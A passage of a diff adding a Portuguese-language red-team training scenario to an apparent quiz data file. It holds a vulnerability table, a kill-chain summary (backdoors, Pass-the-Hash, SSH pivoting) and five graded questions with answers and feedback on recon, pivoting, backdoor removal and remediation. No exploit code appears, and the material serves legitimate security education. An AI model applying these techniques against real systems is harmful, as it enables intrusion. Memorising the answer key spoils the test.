+|  #| Vulnerabilidade              | CVSS  |
++---+------------------------------+-------+
+| 1 | Jupyter sem autenticacao     | 10.0  |
+| 2 | Apache 2.4.49 CVE-2021-41773 |  9.8  |
+| 3 | Credenciais SQL fracas       |  9.1  |
+| 4 | sudo NOPASSWD python/find    |  8.8  |
+| 5 | Script cron com perm. 0777   |  8.8  |
+| 6 | Spear phishing bem-sucedido  |  8.5  |
+| 7 | Domain Controller acessivel  |  9.0  |
++---+------------------------------+-------+
+
+KILL CHAIN:
+  OK Recon: OSINT revelou Jupyter e Apache vulneraveis
+  OK Acesso: 3 vetores simultaneos (Jupyter, CVE-41773, Phishing)
+  OK Escalada: root em 2 servidores via sudo/GTFOBins
+  OK Persistencia: SSH backdoor + cron reverso (removidos apos teste)
+  OK Lateral: Domain Controller via Pass-the-Hash + pivoting SSH
+  OK Objetivo: acesso confirmado a 2.3M registros de clientes
+
+PLANO DE REMEDIACAO:
+  Semana 1: Patch Apache, auth no Jupyter, corrigir sudo NOPASSWD
+  Mes 1: MFA em todos os acessos, segmentacao DMZ/interna
+  Mes 3: EDR em endpoints, SIEM, treinamento anti-phishing`,
+    },
+    perguntas: [
+      {
+        id: 1,
+        texto: "A Fase 1 usa theHarvester e Shodan ANTES do nmap ativo. Por que o reconhecimento passivo é realizado primeiro?",
+        opcoes: [
+          { id: "a", texto: "O reconhecimento passivo é mais preciso do que ferramentas ativas como nmap" },
+          { id: "b", texto: "Reconhecimento passivo não gera tráfego no alvo — coleta inteligência sem alertar IDS/SIEM/SOC, definindo o escopo antes de qualquer ação potencialmente detectável" },
+          { id: "c", texto: "Shodan e theHarvester são mais rápidas que nmap" },
+          { id: "d", texto: "O contrato sempre exige reconhecimento passivo primeiro como cláusula legal" }
+        ],
+        correta: "b",
+        pontos: 60,
+        feedback_correto: "Estratégia de red team correta! Reconhecimento passivo: zero tráfego para o alvo — Shodan consulta bancos de dados públicos, theHarvester busca em fontes abertas. Benefícios: (1) invisível para o SOC do alvo — sem alertas no SIEM, (2) revela ativos esquecidos que o próprio alvo não sabe que estão expostos (servidor old, Jupyter aberto), (3) define a superfície de ataque antes de expor nossa presença com varreduras ativas. Red teams profissionais passam dias em OSINT antes do primeiro pacote.",
+        feedback_errado: "Reconhecimento passivo (OSINT) não gera nenhum tráfego direto para o alvo. Shodan indexa a internet de forma independente, theHarvester consulta fontes públicas. Isso é crítico em red team: o alvo não sabe que está sendo estudado, o SOC não recebe alertas, e você descobre ativos esquecidos (servidor old com Jupyter aberto) que seriam ignorados em uma varredura ativa com escopo definido previamente."
+      },
+      {
+        id: 2,
+        texto: "A Fase 4 instala backdoors (SSH, cron, web shell). O que é OBRIGATÓRIO ao finalizar o engajamento de red team em relação a esses backdoors?",
+        opcoes: [
+          { id: "a", texto: "Manter os backdoors ativos para o cliente verificar as vulnerabilidades por conta própria" },
+          { id: "b", texto: "Documentar TODOS os backdoors no relatório E removê-los completamente — o cliente confirma a remoção antes de encerrar o contrato" },
+          { id: "c", texto: "Entregar as credenciais dos backdoors somente ao CISO por canal criptografado" },
+          { id: "d", texto: "Backdoors temporários expiram automaticamente — não precisam de ação manual" }
+        ],
+        correta: "b",
+        pontos: 60,
+        feedback_correto: "Obrigação ética e contratual fundamental! Backdoors de pentest: (1) DOCUMENTAR — relatório lista cada backdoor: tipo, localização exata, data de instalação, data de remoção, (2) REMOVER TODOS — sem exceção, ao final do engajamento, (3) VERIFICAR — cliente ou equipe interna confirma remoção. Backdoors não removidos: risco de segurança real para o cliente, responsabilidade legal para o red team, e potencial violação do contrato.",
+        feedback_errado: "Todo backdoor instalado em um pentest/red team deve ser: (1) DOCUMENTADO — localização exata, tipo, data de instalação e remoção, (2) REMOVIDO completamente ao final — sem exceções, (3) VERIFICADO pelo cliente. Backdoors não removidos viram vulnerabilidades reais que podem ser exploradas por atacantes externos, além de gerar responsabilidade legal para a empresa de segurança que fez o teste."
+      },
+      {
+        id: 3,
+        texto: "A Fase 5 usa tunnel SSH (-D 9050) + proxychains para pivotar do old-server para a rede interna 10.10.10.0/24. O que o pivoting permite?",
+        opcoes: [
+          { id: "a", texto: "Executar os ataques com maior velocidade por usar a rede interna" },
+          { id: "b", texto: "Acessar recursos da rede interna (Domain Controller, SQL Server) que não estão expostos à internet — usando o servidor comprometido como proxy/relay entre o atacante e a rede interna" },
+          { id: "c", texto: "Evitar que logs sejam gerados no servidor comprometido" },
+          { id: "d", texto: "Usar ferramentas de ataque que não funcionam via internet" }
+        ],
+        correta: "b",
+        pontos: 60,
+        feedback_correto: "Pivoting é o coração do movimento lateral! O Domain Controller (10.10.10.10) e SQL Server (10.10.10.30) estão na rede interna — sem rota da internet. Mas old-server está em ambas as redes (DMZ + interna). SSH -D 9050 cria um proxy SOCKS5: todo tráfego via proxychains é tunelado pelo old-server para a rede interna. Por isso segmentação de rede é crítica: a DMZ jamais deve ter conectividade direta com a rede de produção interna.",
+        feedback_errado: "Pivoting usa um host comprometido como relay: old-server está na DMZ (acessível da internet) E conectado à rede interna. SSH -D cria proxy SOCKS5 local — todo tráfego via proxychains passa pelo old-server e alcança a rede interna onde residem o DC e o banco de dados. Sem pivoting: esses sistemas são inacessíveis. Com pivoting: a segmentação de rede é contornada via o host comprometido. Prevenção: DMZ sem rota para rede interna."
+      },
+      {
+        id: 4,
+        texto: "A Fase 6 identifica 2.3M registros de clientes mas NÃO os exfiltra. Por que um pentest ético NUNCA deve exfiltrar dados reais de clientes?",
+        opcoes: [
+          { id: "a", texto: "Porque os dados são grandes demais para transferir durante o teste" },
+          { id: "b", texto: "Exfiltrar dados reais viola a LGPD (tratamento sem base legal), cria responsabilidade penal para o red team, expõe clientes reais a risco adicional — evidências de que o acesso ERA possível são suficientes" },
+          { id: "c", texto: "Para não deixar rastros excessivos nos logs do servidor" },
+          { id: "d", texto: "O contrato proíbe transferência de arquivos grandes" }
+        ],
+        correta: "b",
+        pontos: 60,
+        feedback_correto: "Fundamento legal e ético essencial! Exfiltrar dados reais em pentest: (1) LGPD — tratamento de dados pessoais sem finalidade legítima é ilegal; pentest não autoriza o red team a processar dados de clientes do cliente, (2) Lei 12.737/2012 — mesmo com autorização parcial, exfiltração não autorizada de dados pode gerar responsabilidade penal, (3) Risco adicional real — dados saindo do ambiente criam mais um ponto de exposição. Suficiente: COUNT(*) + estrutura da tabela = prova sem risco adicional.",
+        feedback_errado: "Exfiltrar dados de clientes é proibido por: (1) LGPD Art. 7 — tratamento de dados pessoais exige base legal, e o contrato de pentest autoriza o teste de segurança, não o processamento de dados pessoais dos clientes, (2) risco adicional para o cliente — dados saindo do ambiente = mais exposição, (3) desnecessário — COUNT(*) e estrutura da tabela provam o acesso sem copiar dados reais. O relatório descreve o impacto potencial, não o causa."
+      },
+      {
+        id: 5,
+        texto: "O relatório prioriza remediações em Semana 1, Mês 1 e Mês 3. Por que Jupyter sem auth e Apache CVE são 'Semana 1' enquanto EDR é 'Mês 3'?",
+        opcoes: [
+          { id: "a", texto: "Por ordem alfabética das tecnologias envolvidas" },
+          { id: "b", texto: "Priorização por CVSS e facilidade de exploração: Jupyter (CVSS 10, qualquer pessoa tem RCE em 30 segundos) e Apache CVE (CVSS 9.8, exploit público) têm correção simples e risco imediato; EDR requer planejamento, orçamento e rollout corporativo complexo" },
+          { id: "c", texto: "EDR é uma tecnologia opcional e os outros são obrigatórios por lei" },
+          { id: "d", texto: "Semana 1 só cobre softwares gratuitos — EDR é uma solução paga" }
+        ],
+        correta: "b",
+        pontos: 60,
+        feedback_correto: "Risk-Based Vulnerability Management perfeito! Critérios de priorização: (1) CVSS score, (2) facilidade de exploração — exploit público? Requer autenticação? (3) esforço de correção. Jupyter sem auth: CVSS 10.0, exploit = abrir o browser e digitar Python, correção = adicionar senha ou tirar da internet (2 minutos). Apache: patch = apt upgrade apache2 (5 minutos). EDR: solução corporativa complexa, meses de planejamento, piloto, deployment. Alto risco + correção simples = Semana 1.",
+        feedback_errado: "Priorização correta usa: CVSS + facilidade de exploração + esforço de correção. Jupyter: CVSS 10.0, qualquer pessoa tem RCE em 30 segundos, correção em 2 minutos → Semana 1. Apache CVE-2021-41773: CVSS 9.8, exploit público amplamente disponível, patch = uma atualização → Semana 1. EDR: projeto corporativo complexo, meses de planejamento e deployment, treinamento de equipe → Mês 3. Alto risco + correção simples = prioridade máxima."
+      }
+    ],
+    conclusao: {
+      o_que_aconteceu: "Red Team de 72h comprometeu toda a infraestrutura da FinSecure Bank: 3 vetores de acesso inicial independentes (Jupyter sem auth, CVE-2021-41773, spear phishing), escalada para root em 2 servidores, pivoting SSH para rede interna, acesso ao Domain Controller via Pass-the-Hash, e identificação de 2.3M registros de clientes sem exfiltração real.",
+      vulnerabilidade: "Kill chain completa executada: OSINT revelou ativos críticos esquecidos, 3 vetores de acesso inicial garantiram redundância operacional, escalada de privilégios via misconfigurações clássicas (sudo, cron, SUID), e segmentação de rede insuficiente permitiu pivoting do DMZ para rede de produção interna.",
+      risco: "Comprometimento total: root em servidores, Domain Admin no Active Directory, e acesso a dados de 2.3M clientes. Impacto regulatório potencial: notificação BACEN (Res. BCB 85/2021), notificação ANPD em 72h (LGPD Art. 48), multas LGPD até R$50M, dano reputacional crítico para instituição financeira.",
+      como_corrigir: "Semana 1: remover Jupyter da internet, patch Apache 2.4.51+, corrigir sudo NOPASSWD, fixar permissões de scripts cron. Mês 1: MFA obrigatório em todos os acessos privilegiados, segmentação DMZ/rede interna com firewall stateful, treinamento intensivo anti-phishing. Mês 3: EDR em todos os endpoints, SIEM com detecção de anomalias e correlação de eventos, programa de red team exercises trimestrais.",
+      boa_pratica: "Red Team vs Pentest: Pentest testa vulnerabilidades específicas com escopo técnico definido. Red Team simula adversário real end-to-end com objetivos de negócio (comprometer o DC, acessar dados de clientes). Frameworks: MITRE ATT&CK (mapa de táticas e técnicas de adversários reais), PTES (Penetration Testing Execution Standard), TIBER-EU (framework de red team para setor financeiro). Certificações: OSCP (Offensive Security Certified Professional), CRTO (Certified Red Team Operator), eCPTX. Regra de ouro: a autorização formal e o scope document são o que separa o red teamer do criminoso — sem eles, é o mesmo crime."
+    }
   }
 ];
 
